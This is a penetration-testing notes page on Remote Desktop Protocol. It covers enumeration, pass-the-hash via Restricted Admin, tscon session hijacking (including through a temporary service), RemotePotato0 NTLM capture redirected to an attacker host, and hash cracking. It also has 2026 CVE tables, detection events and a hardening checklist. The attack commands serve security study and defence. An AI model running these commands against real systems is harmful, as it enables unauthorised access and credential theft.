+++
title = 'RDP'
date = 2026-10-30
type = 'notes'
weight = 500
toc = true
tags = ['protocols', 'services', 'rdp']
+++

Remote Desktop Protocol (RDP) provides a graphical interface to connect to another computer over a network connection. It is one of the most popular administration tools — and one of the most consistently exploited gateways, because it is **enabled by default**, **frequently exposed**, and **under-monitored**.

**Default port:** **TCP/3389**.

> **2025–2026 context:** RDP is not a legacy target. Microsoft shipped **multiple critical RDP Server and Client CVEs** across 2026 — authenticated and unauthenticated use-after-free flaws (CVE-2026-58626, CVE-2026-69525), an **actively exploited privilege escalation** (CVE-2026-21533), a **CVSS 9.8 client-side RCE** (CVE-2026-54990), and two **xrdp** vulnerabilities (CVE-2026-32105, CVE-2026-32107). At the same time, **BlueKeep (CVE-2019-0708) was revived** by the North Korean **Kimsuky** APT in a 2025 campaign against South Korea and Japan, proving that a 2019 pre-auth RCE remains a live initial-access vector on unpatched systems.

---

## 1. Enumeration and Fingerprinting

| Command | Purpose |
|---|---|
| `nmap -p3389 -sV --script rdp-enum-encryption,rdp-ntlm-info <IP>` | Encryption level, NLA status, and **NTLM information disclosure** (hostname, domain, OS version) |
| `nmap -p3389 --script rdp-ms12-020 <IP>` | MS12-020 check — rare/old, but still on unpatched legacy hosts |
| `nmap -p3389 --script "rdp-*" <IP>` | All RDP NSE scripts |
| `rdesktop -u '' <IP>` | Banner probe — an invalid login reveals the OS build and NLA requirement |

> **`rdp-ntlm-info` leaks the Windows version, domain, and hostname before authentication.** That is the input to every CVE lookup in §6 — do not skip it.

---

## 2. Connection and Interaction

| Client | Command |
|---|---|
| **xfreerdp** (FreeRDP) | `xfreerdp /v:<IP> /u:admin /p:password` |
| **xfreerdp with a shared drive** | `xfreerdp /v:<IP> /u:admin /p:password +home-drive` |
| **xfreerdp — clipboard + dynamic resolution** | `xfreerdp /v:<IP> /u:admin /p:password +clipboard /dynamic-resolution` |
| **rdesktop** (legacy) | `rdesktop -u admin -p password123 <IP>` |
| **KRDC** (KDE) | `krdc rdp://admin@<IP>` |
| **Remmina** | Full-featured GUI — RDP, VNC, SSH |

> **FreeRDP (`xfreerdp`) is the CLI client to use** — it is actively maintained, scriptable, and the backend for Remmina. `rdesktop` is legacy and less maintained; use it only when FreeRDP fails on an old server.

**Self-signed certificates:** add `/cert:ignore` to bypass the certificate warning.

---

## 3. Pass-the-Hash over RDP

RDP supports pass-the-hash **only when Restricted Admin mode is enabled** — the value is **inverted**, which is the most common mistake.

```powershell
# 0x0 ENABLES Restricted Admin (required for /pth); 0x1 disables it
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

```bash
xfreerdp /v:<IP> /u:admin /pth:<NTLM_HASH> /cert:ignore
```

**Why Restricted Admin is required:** it prevents the client from **sending reusable credentials to the target** — which is precisely why it enables PtH, and precisely why it is also a **defence**: if Restricted Admin is **not** enabled, the target never receives a reusable credential and PtH cannot proceed. The most significant drop in attacker success occurs when Restricted Admin Mode is introduced, because it stops credential caching on the target.

> **Remote Credential Guard** is the stronger alternative — it does **not** send the password or hash to the remote host at all. Where it is available, it is preferable to Restricted Admin.

---

## 4. RDP Session Hijacking (`tscon`)

`tscon.exe` can **attach one session to another** without a password. When run as **SYSTEM**, it connects a target's **active or disconnected** session to the attacker's — instantly acting as that user.

### 4.1 The technique

```powershell
# List sessions
query user
query session

# As SYSTEM — attach the target session to your own
tscon <TARGET_SESSION_ID> /dest:<YOUR_SESSION_NAME>
```

### 4.2 Without SYSTEM privileges

```cmd
sc.exe create hijack binpath= "cmd.exe /k tscon 1 /dest:rdp-tcp#0"
net start hijack
sc.exe delete hijack
```

> **This is MITRE ATT&CK T1563.002 (RDP Hijacking).** It requires no credentials and produces no login prompt — the attacker simply **becomes** the user. If a **Domain Admin** has a lingering session, this is a direct path to their privileges.

### 4.3 Detection

| Signal | Where |
|---|---|
| **`tscon.exe` running with SYSTEM privileges** | EDR / Sysmon — Microsoft Defender for Cloud explicitly flags this as **a known attacker technique to switch context to any other logged-on user** |
| **Session reassignment without a corresponding authentication event** | **Event 4778** (session reconnected) with no preceding **4624** |
| **A service created with a `tscon` binary path** | **Event 7045** — the service-installation event |

> **The defence is operational.** Log off — do not just disconnect — privileged RDP sessions; set policies to end disconnected sessions quickly; keep Domain Admins off shared member servers; and apply tiered administration so high-value sessions only exist on protected admin workstations.

---

## 5. Enabling RDP (Requires Local Administrator)

```powershell
# 1. Enable RDP
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

# 2. Open the firewall
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes

# 3. Enable Restricted Admin mode (needed for /pth)
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

> **The value is inverted:** `0x0` **enables** Restricted Admin, `0x1` disables it. With it disabled, `/pth` fails.

---

## 6. Recent RDP CVEs (2025–2026)

### 6.1 Server-side RCE and privilege escalation

| CVE | Severity | Primitive | Affected |
|---|---|---|---|
| **CVE-2026-69525** | **Critical** | **Unauthenticated use-after-free** in `rdpdr.sys` — crafted packets trigger premature memory free, leading to **arbitrary write** → **remote code execution**. No credentials required. | Windows Server 2016/2019/2022/2025 |
| **CVE-2026-58626** | **Critical** | **Authenticated use-after-free** in `rdpdr.sys` — malformed **device redirection** messages after a legitimate RDP session → **RCE with elevated privileges**. Requires valid credentials. | Windows Server 2016/2019/2022 |
| **CVE-2026-21533** | **7.8** | **Improper privilege management** in RDS — an **authenticated** attacker elevates to **SYSTEM**. **Actively exploited in the wild since December 2025**; sold on dark-web forums for ~$220,000. Requires no user interaction. | Windows before February 2026 patch |
| **CVE-2026-21519 / CVE-2026-21525** | — | Local privilege escalation in RDS components; CVE-2026-21525 is a **zero-day** that 0patch covered. | Windows |

> **CVE-2026-69525 is the priority.** An **unauthenticated** use-after-free in a core RDP driver is a **wormable** primitive — it is in the same class as BlueKeep, and it affects Server 2016 through 2025.

### 6.2 Client-side RCE — the overlooked direction

| CVE | Severity | Primitive |
|---|---|---|
| **CVE-2026-54990** | **9.8** | **Heap-based buffer overflow** in the **Microsoft Remote Desktop Client** — a **malicious RDP server** sends crafted responses, and the client executes arbitrary code **in the logged-on user's context**. Affects Windows 11 24H2/25H2/26H1 and Server 2025 |
| **CVE-2026-47289** | **Critical** | **Remote Desktop Client RCE** — an **unauthenticated** attacker exploits the client |

> **This is the reverse direction of every other RDP attack.** The victim connects to an **attacker-controlled RDP server**, and the **client** is compromised. Any engagement where an attacker can host a rogue RDP endpoint — a phishing lure, a compromised jump host, a malicious “support” link — is a client-side RCE opportunity.

### 6.3 xrdp (Linux)

| CVE | Primitive |
|---|---|
| **CVE-2026-32105** | **Unauthenticated MITM** — xrdp does **not verify the MAC signature** on received packets in **Classic RDP Security** mode (non-TLS), allowing encrypted traffic to be **tampered with undetected**. Mitigation: `security_layer=tls`. Fixed in **0.10.6** |
| **CVE-2026-32107** | **Local root privilege escalation** — `sesexec` **fails open** if the privilege-drop operation fails, and child processes continue with **root** privileges. Fixed in **0.10.6** |

### 6.4 BlueKeep — CVE-2019-0708 (still live)

A **pre-authentication, wormable RCE** in the RDP service. In **April 2025**, the North Korean **Kimsuky** APT exploited BlueKeep in a campaign against **South Korea and Japan**, targeting software, energy, and financial industries. The group used **RDP vulnerability scanners** to find unpatched systems — confirming that the 2019 flaw is still an **initial-access vector** on legacy hosts.

```bash
# Metasploit module — identifies the OS and vulnerability status
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
```

> **BlueKeep is the clearest argument for full-port scanning.** A host running an unpatched Windows 7 or Server 2008 R2 with 3389 exposed is a pre-auth RCE — and APT groups are still finding them.

---

## 7. RDP in NTLM Relay and Coercion Chains

RDP is not just a login protocol — it is a **relay and coercion surface**.

### 7.1 NTLM relay to RDP

**NTLM relay targets SMB, HTTP, LDAP, MSSQL, and RDP simultaneously.** The classic **Coercion → Relay → ADCS → Domain Admin** chain still works against the vast majority of enterprise environments in 2026.

> **Microsoft's NTLM deprecation does not close the relay path.** Phase 3 (October 2026) blocks **NTLMv1 SSO** by default — but **NTLMv2, the version used in relay, is still permitted**. Full NTLM elimination is not on a fixed public timeline.

### 7.2 Cross-session NTLM relay — RemotePotato0

A **non-privileged** user on a host where a **privileged user has an interactive RDP session** can capture or relay that user's NTLM authentication **without local admin** — using `StandardGetInstanceFromIStorage` to spawn a DCOM object **inside the target session** and redirect the OXID resolution to an attacker-controlled endpoint.

```bash
# Find the target session
ssh user@target 'powershell -c "Get-Process | Group-Object SessionId | Format-Table"'
# The session with explorer.exe / mstsc.exe / rdpclip.exe is the RDP'd user

# Attacker side — redirect OXID resolution to the rogue resolver
socat -d -d -v TCP-LISTEN:135,fork,reuseaddr TCP:<TARGET_IP>:8888 &

# On the target — capture the NETNTLMv2 hash
RemotePotato0.exe -m 2 -s 1 -x <ATTACKER_IP> -p 8888

# Crack
hashcat -m 5600 nigel.netntlm rockyou.txt
```

> **This works on Windows Server 2019/2022** where the classic JuicyPotato OXID-resolver attack on `127.0.0.1` is patched — cross-session DCOM activation still works. **Precondition:** your account needs at least `Certificate Service DCOM Access` or `Distributed COM Users`.

---

## 8. Hardening

| Control | How |
|---|---|
| **Patch RDP Server and Client** | CVE-2026-69525, CVE-2026-58626, CVE-2026-21533, CVE-2026-54990 |
| **Enable NLA** | Network Level Authentication forces authentication **before** a session is established — mitigates pre-auth RCE on legacy hosts |
| **Restrict 3389 to a management VLAN** | Never expose RDP to the internet — use a VPN or an RD Gateway |
| **Enforce Restricted Admin or Remote Credential Guard** | Prevents reusable credentials from reaching the target |
| **Tiered administration** | Domain Admins never log on to member servers; their sessions are never there to hijack |
| **End disconnected sessions** | `Set-RDSetting` — no lingering sessions to `tscon` |
| **Log off privileged sessions** | Disconnecting leaves a session that `tscon` can attach to |
| **Disable RDP if unused** | `fDenyTSConnections = 1` — the only complete fix |
| **Monitor `tscon` with SYSTEM** | Defender for Cloud flags it explicitly |
| **Enforce TLS on xrdp** | `security_layer=tls` — mitigates CVE-2026-32105 |
| **Patch xrdp to 0.10.6** | CVE-2026-32105 and CVE-2026-32107 |

---

## 9. Testing Methodology

```text
1. Enumerate
   - nmap -p3389 --script rdp-enum-encryption,rdp-ntlm-info
   - Is NLA required? Is Restricted Admin enabled?

2. Credentials
   - Password spray one password across the user list
   - Hydra / Crowbar if lockout is absent
   - PtH with /pth if Restricted Admin is enabled

3. Session hijacking
   - query user / query session → find a privileged session
   - As SYSTEM: tscon <id> /dest:<your-session>
   - Without SYSTEM: sc create a service running tscon

4. Coercion and relay
   - Does a privileged user have an interactive RDP session?
   - RemotePotato0 cross-session relay
   - Relay NTLM to RDP, LDAP, ADCS

5. Client-side (if you control the server)
   - CVE-2026-54990 — malicious RDP server → client RCE

6. Patch level
   - CVE-2026-69525 (unauthenticated UAF, critical)
   - CVE-2026-58626 (authenticated UAF)
   - CVE-2026-21533 (actively exploited EoP)
   - CVE-2026-54990 (client RCE, CVSS 9.8)
   - CVE-2019-0708 (BlueKeep — still exploited by APT)
   - xrdp 0.10.6 (CVE-2026-32105, CVE-2026-32107)
```

---

## 10. Field Notes

- **CVE-2026-69525 is the RDP finding of 2026** — an **unauthenticated** use-after-free in `rdpdr.sys` affecting Server 2016 through 2025. It is in the same class as BlueKeep.
- **CVE-2026-21533 is actively exploited in the wild** and was sold on dark-web forums for ~$220,000 — patch RDS-enabled servers first.
- **CVE-2026-54990 is client-side RCE (CVSS 9.8).** A malicious RDP server compromises the **client** in the logged-on user's context — the reverse of every other RDP attack.
- **BlueKeep never left.** Kimsuky exploited it in 2025 against South Korea and Japan — unpatched Windows 7/2008 R2 with 3389 exposed is still an initial-access vector.
- **Restricted Admin is inverted.** `0x0` enables it; `0x1` disables it. Get this wrong and `/pth` fails silently.
- **`tscon` with SYSTEM is the silent lateral move.** No credentials, no prompt — the attacker becomes the user. If a Domain Admin disconnected without logging off, their session is the target.
- **RemotePotato0 works where JuicyPotato is patched.** Cross-session DCOM activation on Server 2019/2022 captures a privileged user's NTLM **without local admin**.
- **NTLMv2 relay is still permitted.** Microsoft's October 2026 deprecation blocks NTLMv1 SSO — the relay chain still works.
- **xrdp has its own 2026 CVEs.** CVE-2026-32105 (MITM traffic tampering without TLS) and CVE-2026-32107 (root privilege escalation via fail-open `sesuid`) — patch to **0.10.6**.
- **The strongest RDP controls are architectural, not detection-based:** NLA, a management VLAN, tiered administration, and ending disconnected sessions. Detection catches the hijack; configuration prevents it.
